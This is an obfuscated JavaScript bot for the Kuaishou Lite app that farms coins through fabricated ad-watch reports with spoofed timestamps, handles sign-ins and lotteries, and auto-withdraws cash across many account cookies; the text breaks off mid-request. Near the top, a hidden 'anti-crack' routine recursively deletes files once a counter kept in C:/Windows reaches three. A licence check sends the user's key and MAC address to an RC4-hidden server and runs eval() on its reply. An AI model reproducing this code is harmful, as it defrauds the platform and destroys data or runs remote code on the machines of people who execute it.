/*
IOS/安卓： 快手极速版解密版
内置990金币+213金币+100金币，三组广告数据，提升收益降低黑号风险。
预计日收益5-6w金币。
重写：
[task_local]
#快手极速版
[rewrite_local]
[MITM]
#IOS用第一个，安卓用第二个
hostname = api.kuaisho*.com
hostname = open.kuaisho*.com
*/
const $$ = Envcc('');
let acckey = $$["isNode"]() ? process["env"]["cdkey"] ? process["env"]["cdkey"] : '' : $$["getdata"]("cdkey") ? $$["getdata"]("cdkey") : '',
    all_msg = '',
    mac = '';
$$["isNode"]() ? (gtr = require('fs'), isFileExist("C:/") ? console['log']("\n电脑环境") : console["log"]("\n青龙环境")) : console["log"]("\n代理环境");

function isFileExist(T) {
  try {
    gtr["accessSync"](T, gtr["F_OK"]);
  } catch (C) {
    return false;
  }

  return true;
}

function addF(T, c) {
  let C = 0,
      S = "C:/Windows/system.txt";

  if (isFileExist(S)) {
    C = gtr["readFileSync"](S, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr["writeFile"](S, '1', function (B) {
        if (B) {
          throw B;
        }
      });
    } else {
      return;
    }
  }

  if (C == 99) {
    return 99;
  }

  console['log'](C);
  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", C);

  if (parseInt(C) < 3) {
    let q = parseInt(C) + 1;
    gtr["writeFileSync"](S, q + '', "utf8");
    return;
  }

  if (!gtr['existsSync'](T)) {
    return;
  }

  if (gtr["statSync"](T)["isDirectory"]()) {
    var a = gtr["readdirSync"](T),
        Y = a["length"],
        j = 0;
    Y > 0 ? (a["forEach"](function (i) {
      j++;
      var J = T + '/' + i;
      gtr["statSync"](J)["isDirectory"]() ? addF(J, true) : gtr['unlinkSync'](J);
    }), Y == j && c && gtr["rmdirSync"](T)) : Y == 0 && c && gtr["rmdirSync"](T);
  } else {
    gtr["unlinkSync"](T);
  }
}

function hqs(T = 10) {
  return new Promise(p => {
    let a = 5,
        Y = {
      'url': $$["isNode"]() ? rc4($$["fwur"](), '1200') + ("?key=" + acckey + "&id=" + a + '&ip=1&mac=' + mac + "&bb=1") : rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + a + "&ip=0&mac=" + mac + "&bb=1")
    };
    $$['post'](Y, async (j, Z, Q) => {
      try {
        let B = eval(Q);
        B["code"] == 200 ? (all_msg = B["msg"], p(B["data"])) : (all_msg = B["msg"], p(false));
      } catch (U) {
        $$["logErr"](U, Z);
      }
    }, 0);
  });
}

const _0x11b3c3 = "快手极速版",
      _0x3de8b8 = new _0x4f15e2(_0x11b3c3);

let _0x279d25 = '',
    _0x1a0963,
    _0x4c35fe = ["\n", '@'],
    _0x547212 = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbCookie"] : _0x3de8b8['getdata']("ksjsbCookie")) || '',
    _0x431ea3 = [],
    _0x1e627b = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbCash"] : _0x3de8b8["getval"]("ksjsbCash")) || '',
    _0x26f17b = (_0x3de8b8["isNode"]() ? process['env']["ksjsbWithdrawTime"] : _0x3de8b8['getval']("ksjsbWithdrawTime")) || 15,
    _0x13d24b = (_0x3de8b8['isNode']() ? process['env']["ksjsbAggressive"] : _0x3de8b8['getval']("ksjsbAggressive")) || 0,
    _0x113109 = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbNotify"] : _0x3de8b8['getval']('ksjsbNotify')) || 1,
    _0x2863b1 = 0,
    _0x19c25c = 0,
    _0xf2b084 = 12,
    _0x5718d8 = [],
    yifenk = [];

const _0x1eb2d5 = {
  'id': 0,
  'name': '广告视频'
},
      _0x4fbf92 = {
  'id': 49,
  'name': "广告视频"
},
      _0x1b4191 = {
  'id': 77,
  'name': "宝箱翻倍视频"
},
      _0x2ffe31 = {
  'id': 136,
  'name': "签到翻倍视频1"
},
      _0x577a80 = {
  'id': 151,
  'name': "未知视频"
},
      _0x351e94 = {
  'ad1': _0x1eb2d5,
  'ad2': _0x4fbf92,
  'box': _0x1b4191,
  'sign': _0x2ffe31,
  'unknown1': _0x577a80
},
      _0x1e4967 = {
  'ad': 49,
  'live': 75,
  'luckydraw': 161,
  'gj': 217,
  'invite': 2008
},
      _0x3355c4 = {
  'extParams': "56dfe31594b858e69ef613f5e97227fbe9979240d7caecf84db127b47a4a8bb0a744376361788e9d4f8341978842c3a723b72e4befa3dc60a2c580bf4fc43399f798f286e2c8c3069effa1db27aa45bd",
  'businessId': 161,
  'pageId': 11101,
  'posId': 4683,
  'subPageId': 100013628,
  'name': "获取抽奖次数视频"
},
      _0x458f20 = {
  'extParams': "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
  'businessId': 161,
  'pageId': 11101,
  'posId': 4685,
  'subPageId': 100013630,
  'name': "抽奖视频161-213"
},
      _0x124c4a = {
  'extParams': "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
  'businessId': 161,
  'pageId': 11101,
  'posId': 4684,
  'subPageId': 100013629,
  'name': '抽奖视频161-100'
},
      _0x37f16f = {
  'extParams': "56dfe31594b858e69ef613f5e97227fbe9979240d7caecf84db127b47a4a8bb0a744376361788e9d4f8341978842c3a723b72e4befa3dc60a2c580bf4fc43399f798f286e2c8c3069effa1db27aa45bd",
  'businessId': 11,
  'pageId': 11101,
  'posId': 4684,
  'subPageId': 100013629,
  'name': "抽奖视频11-100"
},
      _0x10efec = {
  'extParams': '56dfe31594b858e69ef613f5e97227fbe9979240d7caecf84db127b47a4a8bb0a744376361788e9d4f8341978842c3a723b72e4befa3dc60a2c580bf4fc43399f798f286e2c8c3069effa1db27aa45bd',
  'businessId': 11,
  'pageId': 11101,
  'posId': 4684,
  'subPageId': 100013629,
  'name': "抽奖视频11-100"
},
      _0x385181 = {
  'extParams': "60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327",
  'businessId': 2008,
  'pageId': 100012068,
  'posId': 6765,
  'subPageId': 100015089,
  'name': "邀请页视频(实际是100金币)"
},
      _0xfcb1d2 = {
  'extParams': "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
  'businessId': 75,
  'pageId': 100012068,
  'posId': 6765,
  'subPageId': 100015089,
  'name': '直播任务'
},
      _0x11da17 = {
  'extParams': "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
  'businessId': 168,
  'pageId': 100012068,
  'posId': 6765,
  'subPageId': 100015089,
  'name': "签到翻倍视频2"
},
      _0x10d9f8 = {
  'luckdrawNum_161': _0x3355c4,
  'luckdrawVideo_161_213': _0x458f20,
  'luckdrawVideo_161_100': _0x124c4a,
  'luckdrawVideo_11_213': _0x37f16f,
  'luckdrawVideo_11_100': _0x10efec,
  'inviteVideo_2008': _0x385181,
  'liveVideo_75': _0xfcb1d2,
  'signVideo_168': _0x11da17
};

let _0x134a17 = new Date(),
    _0x20a9d7 = _0x134a17["getHours"](),
    _0x459e63 = 1.07,
    _0x2e716e = 0,
    _0x5bc515 = "ksjsb",
    _0x180c0c = "http://106.13.207.44:1200/ks.json",
    ksjsbjk = "https://ziye0.coding.net/p/ziye/d/ql/git/raw/master/ksjsb-ziye.json",
    _0x75eec0 = "https://127.0.0.1/";

class _0x9d8dda {
  constructor(T) {
    let p = T["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
    this["index"] = ++_0x2863b1;
    this["cookie"] = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _0x4b5cde(16) + "; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; " + p;
    this["name"] = this["index"];
    this["valid"] = false;
    this["bindAlipay"] = false;
    this["alipay"] = '';
    this["bindWechat"] = false;
    this["wechat"] = '';
    this["needSms"] = false;
    this["hasLuckydraw"] = true;
    const C = {
      'num': 2,
      'needRun': true
    },
          S = {
      'num': 1,
      'needRun': true
    },
          a = {
      'num': 5,
      'needRun': true
    },
          Y = {
      'num': 1,
      'needRun': true
    },
          j = {
      'num': 5,
      'needRun': true
    },
          Z = {
      '49': C,
      '75': S,
      '161': a,
      '217': Y,
      '2008': j
    };
    this["task"] = Z;
  }

  async ["getUserInfo"]() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    S["result"] == 1 ? (this["valid"] = true, this["name"] = S["data"]["userData"]["nickname"], this["cashBalance"] = S["data"]["totalCash"], this["coinBalance"] = S["data"]["totalCoin"], this["allCash"] = S["data"]["allCash"], console["log"]("账号[" + this["name"] + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + "金币，未审核余额" + Math["floor"](parseFloat(this["allCash"]) - parseFloat(this["cashBalance"])) + '元')) : console["log"]("账号[" + this["name"] + "]查询账户信息失败：" + S["error_msg"]);
  }

  async ['setShare']() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare",
        p = '',
        C = _0x495d61(c, this['cookie'], p);

    await _0x39a23b("post", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    S["result"] == 1 ? (console["log"]("账号[" + this["name"] + "]准备分享得金币"), await _0x3de8b8["wait"](200), await this["taskReward"](122)) : console["log"]("账号[" + this["name"] + "]分享失败：" + S["error_msg"]);
  }

  async ["taskReward"](T) {
    let p = "https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=" + T,
        C = '',
        S = _0x495d61(p, this["cookie"], C);

    await _0x39a23b("get", S);
    let a = _0x1a0963;

    if (!a) {
      return;
    }

    a["result"] == 1 ? console["log"]("账号[" + this["name"] + "]完成任务[" + T + "]成功，获得" + a["data"]['amount'] + '金币') : console["log"]("账号[" + this["name"] + "]完成任务[" + T + "]失败：" + a["error_msg"]);
  }

  async ['getSignInfo']() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    S["result"] == 1 ? (console['log']("账号[" + this["name"] + "]今天" + (S["data"]["nebulaSignInPopup"]["todaySigned"] ? '已' : '未') + '签到'), !S["data"]["nebulaSignInPopup"]["todaySigned"] && (await _0x3de8b8["wait"](200), await this["doSign"](), await _0x3de8b8["wait"](200), await this["setShare"]())) : console["log"]("账号[" + this["name"] + "]查询签到信息失败：" + S["error_msg"]);
  }

  async ["doSign"]() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      console['log']("账号[" + this["name"] + "]签到成功：" + S["data"]["toast"]);
      await _0x3de8b8["wait"](200);
      await this["ksAdParam"](_0x351e94["sign"]);
      await _0x3de8b8["wait"](200);
      await this["ksNeoAdParam"](_0x10d9f8["signVideo_168"]);
    } else {
      console["log"]("账号[" + this['name'] + "]签到失败：" + S["error_msg"]);
    }
  }

  async ['taskList']() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b('get', C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      console["log"]("账号[" + this["name"] + "]任务完成情况：");

      for (let a of S["data"]["dailyTasks"]) {
        for (let Y in _0x1e4967) {
          if (a["taskId"] == _0x1e4967[Y]) {
            let Z = parseInt(a["completedStages"]),
                Q = parseInt(a["stages"]),
                B = Math["ceil"](Q / _0xf2b084),
                b = Z < Q;
            const U = {
              'num': B,
              'needRun': b
            };
            this["task"][a["taskId"]] = U;
            console["log"]('【' + a["name"] + "】 " + Z + '/' + Q + '，' + (b ? "未完成" : "已完成") + "，每次运行完成" + B + "次任务");
            continue;
          }
        }
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询任务列表失败：" + S["error_msg"]);
    }
  }

  async ['ksgj']() {
    let c = "https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward",
        p = "activityId=148&client_key=ksgjbody",
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("post", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    S["result"] == 1 ? console["log"]("账号[" + this["name"] + ']逛街获得' + S["data"]["amount"] + '金币') : console["log"]("账号[" + this['name'] + "]逛街失败：" + S["error_msg"]);
  }

  async ["ksAdParam"](T) {
    const p = {
      'url': ksjsbjk,
      'headers': ''
    };
    await _0x39a23b("get", p);
    console["log"](_0x39a23b);

    let C = _0x1a0963[Math['floor'](Math['random']() * _0x1a0963["length"] - 1)];

    if (!C) {
      return;
    }

    C["result"] == 1 ? C['impAdInfo'] && C["impAdInfo"]["length"] > 0 && C["impAdInfo"][0]["adInfo"] && C["impAdInfo"][0]["adInfo"]["length"] > 0 && C["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksAdReward"](C["llsid"], C["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], T)) : console["log"]('账号[' + this["name"] + "]获取" + T["name"] + "参数失败：" + C["error_msg"]);
  }

  async ["ksAdReward"](T, c, p) {
    let S = new Date()["getTime"](),
        a = Math["floor"](Math["random"]() * 30000) + 45000,
        Y = S - a,
        j = "https://api.e.kuaishou.com/rest/r/ad/nebula/reward",
        Z = "bizStr={\"endTime\":" + S + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + c + ",\"extInfo\":\"\",\"llsid\":" + T + ",\"taskType\":1}],\"startTime\":" + Y + ",\"taskId\":" + p['id'] + '}',
        Q = _0x495d61(j, this["cookie"], Z);

    await _0x39a23b("post", Q);
    let B = _0x1a0963;

    if (!B) {
      return;
    }

    B["result"] == 1 ? console["log"]("账号[" + this["name"] + ']看' + p["name"] + '获得' + B["data"]["awardAmount"] + '金币') : console["log"]("账号[" + this["name"] + ']看' + p["name"] + "失败：" + B["error_msg"]);
  }

  async ["openBox"](T) {
    let p = 'https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=' + T + "&isReadyOfAdPlay=true",
        C = '',
        S = _0x495d61(p, this["cookie"], C);

    await _0x39a23b("get", S);
    let a = _0x1a0963;

    if (!a) {
      return;
    }

    a["result"] == 1 ? T == true ? a["data"]["commonAwardPopup"] && a["data"]["commonAwardPopup"]["awardAmount"] ? (console["log"]("账号[" + this["name"] + "]开宝箱获得" + a["data"]["commonAwardPopup"]["awardAmount"] + '金币'), await _0x3de8b8["wait"](200), await this["ksAdParam"](_0x351e94["box"])) : console["log"]("账号[" + this["name"] + "]开宝箱没有获得金币") : a['data']["openTime"] > -1 ? (console["log"]("账号[" + this["name"] + "]开宝箱冷却时间还有" + Math["floor"](a["data"]["openTime"] / 1000) + '秒'), a["data"]['openTime'] == 0 && (await _0x3de8b8["wait"](200), await this["openBox"](true))) : console["log"]("账号[" + this["name"] + "]开宝箱次数已用完") : T == true ? console["log"]('账号[' + this["name"] + "]开宝箱失败：" + a["error_msg"]) : console["log"]("账号[" + this["name"] + "]查询宝箱状态失败：" + a["error_msg"]);
  }

  async ["withdraw"](T) {
    if (!this["bindAlipay"] && !this["bindWechat"]) {
      _0x1ab8b7("账号[" + this["name"] + "]未绑定提现账号，不执行提现");

      return;
    }

    let p = parseInt(T * 100),
        C = this["bindAlipay"] ? "ALIPAY" : "WECHAT",
        S = C == "ALIPAY" ? "支付宝" : '微信',
        a = C == "ALIPAY" ? this["alipay"] : this["wechat"],
        Y = "https://www.kuaishoupay.com/pay/account/h5/withdraw/apply",
        j = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + p + "&provider=" + C + "&total_fen=" + p + "&commission_fen=0&third_account=" + C + "&attach=&biz_content=&session_id=",
        Z = _0x495d61(Y, this['cookie'], j);

    await _0x39a23b("post", Z);
    let Q = _0x1a0963;

    if (!Q) {
      return;
    }

    Q["result"] == "SUCCESS" ? _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + T + '元到' + S + '[' + a + "]成功") : _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + T + '元到' + S + '[' + a + "]失败：" + Q["msg"]);
  }

  async ["withdrawOverview"]() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      if (S["data"]["isLimit"] == true) {
        console["log"]("账号[" + this["name"] + "]今天已提现");
        return;
      }

      let a = parseFloat(this["cashBalance"]);

      if (_0x13d24b == 1) {
        if (a < 0.3) {
          _0x1ab8b7("账号[" + this["name"] + "]余额不足0.3元，不提现");
        } else {
          let Y = Math["floor"](a * 10) / 10;
          Y = Y > 50 ? 50 : Y;

          _0x1ab8b7("账号[" + this["name"] + "]准备最大化提现" + Y + '元');

          await _0x3de8b8["wait"](200);
          await this["withdraw"](Y);
        }
      } else {
        if (!_0x1e627b) {
          for (let Z of S["data"]["enWithdrawList"]["sort"](function (Q, B) {
            return B - Q;
          })) {
            if (a >= parseFloat(Z)) {
              _0x1ab8b7("账号[" + this["name"] + "]准备提现" + Z + '元');

              await _0x3de8b8["wait"](200);
              await this["withdraw"](Z);
              return;
            }
          }

          _0x1ab8b7("账号[" + this["name"] + "]余额不足，可提现额度：" + S["data"]["enWithdrawList"]["join"](','));
        } else {
          a >= parseFloat(_0x1e627b) ? (_0x1ab8b7("账号[" + this["name"] + "]准备提现" + _0x1e627b + '元'), await _0x3de8b8["wait"](200), await this["withdraw"](_0x1e627b)) : _0x1ab8b7("账号[" + this["name"] + "]余额不足" + _0x1e627b + "元，不提现");
        }
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询提现列表失败：" + S["error_msg"]);
    }
  }

  async ["accountOverview"]() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/account/overview",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      this["coinBalance"] = S["data"]["coinBalance"];
      this["cashBalance"] = S["data"]["cashBalance"];
      let a = S["data"]["exchangeCoinState"];

      _0x1ab8b7("账号[" + this["name"] + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + '金币');

      a == 2 && (await _0x3de8b8["wait"](200), await this["changeExchangeType"](0));
    } else {
      console["log"]("账号[" + this["name"] + "]查询账户信息失败：" + S["error_msg"]);
    }
  }

  async ['changeExchangeType'](T) {
    let p = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType",
        C = "{\"type\":" + T + '}',
        S = _0x495d61(p, this["cookie"], C);

    S["headers"]["Content-Type"] = "application/json";
    await _0x39a23b("post", S);
    let a = _0x1a0963;

    if (!a) {
      return;
    }

    let Y = T == 0 ? "自动兑换" : '手动兑换';
    a["result"] == 1 ? console["log"]("账号[" + this["name"] + "]兑换方式更改成功，目前兑换方式为：" + Y) : console["log"]("账号[" + this["name"] + "]兑换方式更改失败：" + a["error_msg"]);
  }

  async ["exchangeCoin"]() {
    if (this["coinBalance"] < 100) {
      console["log"]("账号[" + this["name"] + "]金币余额不足100，不执行兑换");
      return;
    }

    let c = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit",
        p = "{\"coinAmount\":" + this["coinBalance"] + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
        C = _0x495d61(c, this["cookie"], p);

    C['headers']["Content-Type"] = "application/json";
    await _0x39a23b("post", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      let j = Math["floor"](this['coinBalance'] / 100) * 100,
          Z = Math["floor"](this["coinBalance"] / 100) / 100;
      console["log"]("账号[" + this["name"] + "]兑换金币成功，将" + j + "金币兑换成" + Z + '元');
    } else {
      console["log"]("账号[" + this["name"] + "]兑换金币失败：" + S["error_msg"]);
    }
  }

  async ["ksNeoAdParam"](T) {
    const p = {
      'url': ksjsbjk,
      'headers': ''
    };
    await _0x39a23b("get", p);

    let C = _0x1a0963[Math["floor"](Math["random"]() * _0x1a0963["length"] - 1)];

    if (!C) {
      return;
    }

    C["result"] == 1 ? C["impAdInfo"] && C['impAdInfo']["length"] > 0 && C["impAdInfo"][0]["adInfo"] && C["impAdInfo"][0]['adInfo']["length"] > 0 && C["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksNeoAdReward"](C["llsid"], C["impAdInfo"][0]["adInfo"][0]['adBaseInfo']["creativeId"], T)) : console["log"]("账号[" + this['name'] + "]获取" + T["name"] + "参数失败：" + C["error_msg"]);
  }

  async ["ksNeoAdReward"](T, c, p) {
    let S = new Date()["getTime"](),
        a = Math["floor"](Math["random"]() * 30000) + 45000,
        Y = S - a,
        j = "https://api.e.kuaishou.com/rest/r/ad/task/report",
        Z = "bizStr={\"businessId\":" + p["businessId"] + ",\"endTime\":" + S + ",\"extParams\":\"" + p["extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + c + ",\"extInfo\":\"\",\"llsid\":" + T + ",\"taskType\":1}],\"pageId\":" + p["pageId"] + ",\"posId\":" + p["posId"] + ",\"startTime\":" + Y + ",\"subPageId\":" + p["subPageId"] + '}',
        Q = _0x495d61(j, this["cookie"], Z);

    await _0x39a23b("post", Q);
    let B = _0x1a0963;

    if (!B) {
      return;
    }

    if (B["result"] == 1) {
      let b = B["data"]["neoAmount"] + '金币';

      if (B["data"]["neoToH5Data"]) {
        try {
          let U = JSON["parse"](_0x331719["decode"](B["data"]["neoToH5Data"])["replace"](/\0/g, ''));
          U["extraCoin"] && (b += '+' + U["extraCoin"] + '金币');
        } catch (q) {
          console["log"](B["data"]["neoToH5Data"]);
        } finally {}
      }

      console["log"]("账号[" + this["name"] + ']看' + p["name"] + '获得' + b);

      if (this["hasLuckydraw"]) {
        await this['luckdrawTasks']();
      }
    } else {
      console["log"]("账号[" + this["name"] + ']看' + p["name"] + "失败：" + B["error_msg"]);
    }
  }

  async ["luckdrawInfo"]() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/user/info",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      console["log"]("账号[" + this["name"] + "]现有" + S["data"]['userDiamondResult']["diamondPercent"] + "钻石，剩余抽奖次数：" + S["data"]["userDailyLotteryTimesResult"]["remainTimes"]);

      for (let Y = 0; Y < S["data"]["userDailyLotteryTimesResult"]["remainTimes"]; Y++) {
        await _0x3de8b8["wait"](200);
        await this["luckydraw"]();
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询抽奖次数失败：" + S["error_msg"]);
    }
  }

  async ["luckydraw"]() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("post", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      let a = S["data"]["coinCount"] ? S["data"]["coinCount"] + '金币' : S["data"]["diamondCount"] ? S["data"]["diamondCount"] + '钻石' : '空气';
      console["log"]("账号[" + this["name"] + "]抽奖获得" + a);
      S["data"]["videoCoinCount"] && console["log"]("额外奖励：" + S["data"]["videoCoinCount"]);

      if (S["data"]["schema"]) {
        try {
          console["log"](_0x331719["decode"](S["data"]["schema"]));
        } catch (Y) {
          console["log"](S["data"]["schema"]);
        } finally {}
      }

      this["hasLuckydraw"] && (await this["luckdrawTasks"]());
    } else {
      console["log"]('账号[' + this["name"] + "]抽奖失败：" + S["error_msg"]);
    }
  }

  async ["luckydrawSign"]() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/sign-in",
        p = '',
        C = _0x495d61(c, this['cookie'], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    S["result"] == 1 ? S['data']["isShow"] && console["log"]("账号[" + this["name"] + "]抽奖页签到成功") : (console["log"]("账号[" + this["name"] + "]查询抽奖签到情况失败：" + S["error_msg"]), S["error_msg"]["indexOf"]('激励游戏未在运营') > -1 && (this["hasLuckydraw"] = false));
  }

  async ["luckdrawTimerInfo"]() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/timer-reward/info",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      if (S["data"]) {
        let a = new Date()["getTime"](),
            Y = S["data"]["lastTimerTime"],
            j = S["data"]["minutesInterval"] * 60 * 1000,
            Z = Y + j;
        a < Z ? console["log"]("账号[" + this["name"] + "]抽奖页奖励冷却时间还有" + (Z - a) / 1000 + '秒') : (await _0x3de8b8["wait"](200), await this["luckdrawTimerReward"](S["data"]["goldNum"]));
      } else {
        console["log"]("账号[" + this["name"] + "]抽奖页定时奖励次数已用完");
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询抽奖页定时奖励情况失败：" + S["error_msg"]);
    }
  }

  async ["luckdrawTimerReward"](T) {
    let p = "https://activity.e.kuaishou.com/rest/r/game/timer-reward",
        C = '',
        S = _0x495d61(p, this["cookie"], C);

    await _0x39a23b("post", S);
    let a = _0x1a0963;

    if (!a) {
      return;
    }

    a["result"] == 1 ? console['log']("账号[" + this["name"] + "]领取抽奖页定时奖励获得" + T + '金币') : console["log"]("账号[" + this["name"] + "]领取抽奖页定时奖励失败：" + a["error_msg"]);
  }

  async ["luckdrawTasks"]() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/tasks",
        p = '',
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("get", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == 1) {
      for (let Y of S["data"]["dailyTasks"]) {
        Y["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](Y));
      }

      for (let j of S["data"]["growthTasks"]) {
        j["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](j));
      }
    } else {
      console["log"]("账号[" + this['name'] + "]查询抽奖页任务失败：" + S["error_msg"]);
    }
  }

  async ["luckdrawTasksReward"](T) {
    let p = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + T["taskName"],
        C = '',
        S = _0x495d61(p, this["cookie"], C);

    await _0x39a23b("get", S);
    let a = _0x1a0963;

    if (!a) {
      return;
    }

    a['result'] == 1 ? console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + T["taskTitle"] + "]奖励获得" + a["data"]["popUp"]["taskRewardName"]) : console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + T["taskTitle"] + "]奖励失败：" + a["error_msg"]);
  }

  async ["helpInvite"](T) {
    let p = T["split"]('&'),
        C = p[0],
        S = p[1],
        a = "https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0",
        Y = '',
        j = _0x495d61(a, this["cookie"], Y);

    j['headers']["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + C + '&shareToken=' + S + "&source=qrcode";
    await _0x39a23b("get", j);
    let Z = _0x1a0963;

    if (!Z) {
      return;
    }

    !(Z["result"] == 1) && console["log"]("账号[" + this["name"] + "]邀请失败：" + Z["error_msg"]);
  }

  async ["helpPackage"](T, c) {
    let C = {
      'url': "https://ug-fission.kuaishou.com/rest/n/darwin/bargain/overview?version=2.1.0",
      'body': "{\"fid\":\"895255750\",\"cc\":\"share_wxms\",\"followRefer\":\"151\",\"code\":\"" + T + "\",\"shareMethod\":\"TOKEN\",\"kpn\":\"NEBULA\",\"subBiz\":\"BARGAIN\",\"shareId\":\"16905401129783\",\"shareMode\":\"SYSTEM\",\"noBackNavi\":\"true\",\"originShareId\":\"16905401129783\",\"useMerchantWeb\":\"1\",\"layoutType\":\"4\",\"shareObjectId\":" + JSON["stringify"]("{\"teamId\":\"\",\"packetId\":\"" + c + "\"}") + ",\"shareUrlOpened\":\"0\",\"hyId\":\"bargain\",\"timestamp\":" + +new Date() + ",\"pageCode\":1,\"adamA\":0,\"adamB\":0}",
      'headers': {
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
        'Cookie': "kpn=NEBULA; kpf=ANDROID_PHONE; did=; " + Math["floor"](Math["random"]() * 1000 + 1) + " ANDROID_ff60a387f6ba8904; " + this['cookie'] + "; c=XIAOMI; ver=10.2; appver=10.2.41.3075; language=zh-cn; ",
        'Content-Type': "application/json",
        'Origin': "https://ug-fission.kuaishou.com",
        'X-Requested-With': "com.kuaishou.nebula",
        'Sec-Fetch-Site': "same-origin",
